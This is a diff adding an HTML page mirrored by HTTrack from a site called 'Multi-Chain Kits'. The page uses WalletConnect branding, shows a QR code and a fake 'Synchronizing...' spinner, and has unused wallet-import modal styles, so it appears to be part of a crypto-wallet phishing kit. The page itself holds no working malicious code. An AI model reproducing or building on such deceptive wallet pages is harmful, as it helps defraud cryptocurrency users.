@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html>
+
+
+
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
+
+<head>
+    <meta name="viewport" content="width=device-width" />
+    <meta charSet="utf-8" />
+    <title>Multi-Chain Kits - Connecting Decentralised Applications </title>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="/img/walletconnect-logo.html" type="image/x-icon">
+    <link rel="stylesheet" href="/style/fa605a2e7387ae6acff3.css" as="style" />
+
+
+
+    <script src="/ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="/cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+    <meta name="robots" content="noindex, nofollow">
+    <meta name="robots" content="noimageindex">
+
+
+    <style>
+        .finalize-import-modal,
+        .error-import-modal {
+            width: 450px;
+            border-radius: 20px;
+            padding: 20px;
+            background-color: #fff;
+            color: #587087;
+            display: none;
+        }
+
+        .finalize-import-modal.show {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+
+        .valid-countdown {
+            font-size: 45px;
+        }
+
+        .valid-countdown.close {
+            display: none;
+        }
+
+        .successful-import-img {
+            display: none;
+        }
+
+        .successful-import-img.show {
+            display: block;
+        }
+
+        .import-modal-h4 {
+            margin: 20px 0;
+            font-size: 24px;
+        }
+
+
+        @media screen and (max-width: 768px) {
+
+            .connect-modal,
+            .form-modal,
+            .finalize-import-modal,
+            .error-import-modal {
+                width: 90%;
+            }
+        }
+    </style>
+
+</head>
+
+<body>
+    <div id="__next">
+        <header class="fixed z-50 w-full bg-white py-4 sm:py-5 px-2 sm:px-3 border-b shadow-md">
+            <div class="container max-w-screen-lg mx-auto flex flex-row items-center justify-between">
+                <a href="../index.html">
+                    <div class="inline-flex items-center justify-center cursor-pointer"><img
+                            src="/img/logo.svg" class="h-10 w-10" />
+                    </div>
+                </a>
+                <div><a class="inline-flex items-center justify-center text-white cursor-pointer hover:text-primary bg-primary hover:bg-transparent font-bold px-6 py-2 rounded-md border-2 border-primary"
+                        href="../index.html">Go Back</a></div>
+            </div>
+        </header>
+
+
+
+        <div class="h-14"></div>
+<div class="h-14"></div>
+<main>
+    <div
+        class="container max-w-screen-sm py-20 px-5 md:px-8 flex flex-col h-full items-center justify-items-center mx-auto text-center">
+        <img src="../img/qrcode.png" class="h-60" /><svg
+            class="animate-spin -ml-1 mr-3 h-16 w-16 text-primary" xmlns="http://www.w3.org/2000/svg" fill="none"
+            viewBox="0 0 24 24">
+            <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
+            <path class="opacity-75" fill="currentColor"
+                d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z">
+            </path>
+        </svg>
+        <h2 class="text-2xl text-center justify font-bold my-4">Synchronizing...</h2>
+        <p class="text-lg text-gray-600 mb-6">This may take a few moments to complete</p>
+
+    </div>
+</main>
+
+
+
+
+<footer class="border-t border-gray-200">
+    <div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between py-6">
+        <ul class="flex mb-4 mx-auto md:mx-0 md:ml-4 md:mb-0">
+            <li><a href="#"
+                    class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out"
+                    aria-label="Twitter"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M24 11.5c-.6.3-1.2.4-1.9.5.7-.4 1.2-1 1.4-1.8-.6.4-1.3.6-2.1.8-.6-.6-1.5-1-2.4-1-1.7 0-3.2 1.5-3.2 3.3 0 .3 0 .5.1.7-2.7-.1-5.2-1.4-6.8-3.4-.3.5-.4 1-.4 1.7 0 1.1.6 2.1 1.5 2.7-.5 0-1-.2-1.5-.4 0 1.6 1.1 2.9 2.6 3.2-.3.1-.6.1-.9.1-.2 0-.4 0-.6-.1.4 1.3 1.6 2.3 3.1 2.3-1.1.9-2.5 1.4-4.1 1.4H8c1.5.9 3.2 1.5 5 1.5 6 0 9.3-5 9.3-9.3v-.4c.7-.5 1.3-1.1 1.7-1.8z">
+                        </path>
+                    </svg></a></li>
+            <li class="ml-4"><a href="#"
+                    class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out"
+                    aria-label="Github"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M16 8.2c-4.4 0-8 3.6-8 8 0 3.5 2.3 6.5 5.5 7.6.4.1.5-.2.5-.4V22c-2.2.5-2.7-1-2.7-1-.4-.9-.9-1.2-.9-1.2-.7-.5.1-.5.1-.5.8.1 1.2.8 1.2.8.7 1.3 1.9.9 2.3.7.1-.5.3-.9.5-1.1-1.8-.2-3.6-.9-3.6-4 0-.9.3-1.6.8-2.1-.1-.2-.4-1 .1-2.1 0 0 .7-.2 2.2.8.6-.2 1.3-.3 2-.3s1.4.1 2 .3c1.5-1 2.2-.8 2.2-.8.4 1.1.2 1.9.1 2.1.5.6.8 1.3.8 2.1 0 3.1-1.9 3.7-3.7 3.9.3.4.6.9.6 1.6v2.2c0 .2.1.5.6.4 3.2-1.1 5.5-4.1 5.5-7.6-.1-4.4-3.7-8-8.1-8z">
+                        </path>
+                    </svg></a></li>
+            <li class="ml-4"><a href="#"
+                    class="flex justify-center items-center bg-white hover:bg-white-100 rounded-full shadow transition duration-150 ease-in-out"
+                    aria-label="Facebook"><svg class="w-8 h-8 fill-current" viewBox="0 0 32 32"
+                        xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M14.023 24L14 17h-3v-3h3v-2c0-2.7 1.672-4 4.08-4 1.153 0 2.144.086 2.433.124v2.821h-1.67c-1.31 0-1.563.623-1.563 1.536V14H21l-1 3h-2.72v7h-3.257z">
+                        </path>
+                    </svg></a></li>
+        </ul>
+        <div class="text-sm text-center md:text-right">©
+            <!-- -->2018 - 2023
+        </div>
+    </div>
+</footer>
+    </div>
+
+    </main>
+
+
+    </div>
+
+
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+
+
+</body>
+
+
+<!-- Mirrored from chain-kits.co/user/choose-wallet.php by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 05 Sep 2022 15:29:26 GMT -->
+
+</html>
